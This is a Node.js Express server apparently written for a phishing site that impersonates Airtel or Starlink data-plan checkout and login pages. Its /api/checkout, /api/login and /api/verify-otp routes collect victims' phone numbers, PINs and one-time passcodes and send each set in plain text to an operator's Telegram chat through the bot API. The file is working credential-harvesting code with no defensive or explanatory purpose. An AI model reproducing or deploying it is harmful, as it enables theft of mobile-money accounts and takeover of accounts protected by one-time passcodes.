// server.js — DRC Airtel / Starlink backend (Render)

const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ---------- Config ----------
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

let publicUrl = process.env.PUBLIC_URL || '';
if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
  publicUrl = process.env.RENDER_EXTERNAL_URL;
}

// ---------- Telegram ----------
async function tgSend(text, retries = 3) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('⚠️  Telegram env missing — cannot send');
    return;
  }

  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      const data = await res.json();
      if (!data.ok) {
        console.error(`Telegram error (attempt ${i + 1}):`, data);
        if (data.error_code === 400 || data.error_code === 401) break; // no point retrying
      } else {
        console.log('✅ Telegram message sent');
        return;
      }
    } catch (err) {
      console.error(`Telegram send failed (attempt ${i + 1}):`, err.message);
      if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

async function tgSetWebhook() {
  if (!BOT_TOKEN || !publicUrl) {
    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or publicUrl missing');
    return;
  }
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  try {
    console.log(`🔗 Registering webhook: ${webhookUrl}`);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const data = await res.json();
    if (data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
    else console.error('❌ Webhook failed:', data);
  } catch (err) {
    console.error('❌ Webhook error:', err.message);
  }
}

// ---------- API routes ----------
app.post('/api/checkout', async (req, res) => {
  const { plan, data, price, period, phone, pin } = req.body || {};
  console.log('📥 Checkout:', { plan, data, price, period, phone });
  await tgSend(
    `🛒 <b>New Checkout</b>\n\n` +
    `📦 Plan: <b>${plan || '-'}</b>\n` +
    `💾 Data: <b>${data || '-'}</b>\n` +
    `💰 Price: <b>ZMW ${price ?? '-'}</b>\n` +
    `⏱ Period: <b>${period || '-'}</b>\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔑 PIN: <b>${pin || '-'}</b>`
  );
  res.json({ ok: true });
});

app.post('/api/login', async (req, res) => {
  const { phone, pin } = req.body || {};
  console.log('📥 Login:', { phone });
  await tgSend(
    `🔐 <b>Login Attempt</b>\n\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔑 PIN: <b>${pin || '-'}</b>`
  );
  res.json({ ok: true });
});

app.post('/api/verify-otp', async (req, res) => {
  const { phone, otp } = req.body || {};
  console.log('📥 OTP:', { phone });
  await tgSend(
    `🔢 <b>OTP Submitted</b>\n\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔢 OTP: <b>${otp || '-'}</b>`
  );
  res.json({ ok: true });
});

app.post('/api/telegram-webhook', (req, res) => {
  console.log('📨 Telegram update:', JSON.stringify(req.body).slice(0, 200));
  res.sendStatus(200);
});

// ---------- Serve the static site ----------
// HTML files live at repo root; server.js lives in backend/
app.use(express.static(path.join(__dirname, '..')));

// Root → landing page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
  console.log(`   BOT_TOKEN set: ${BOT_TOKEN ? 'YES' : 'NO'}`);
  console.log(`   CHAT_ID set:   ${CHAT_ID ? 'YES' : 'NO'}`);
  tgSetWebhook();
});
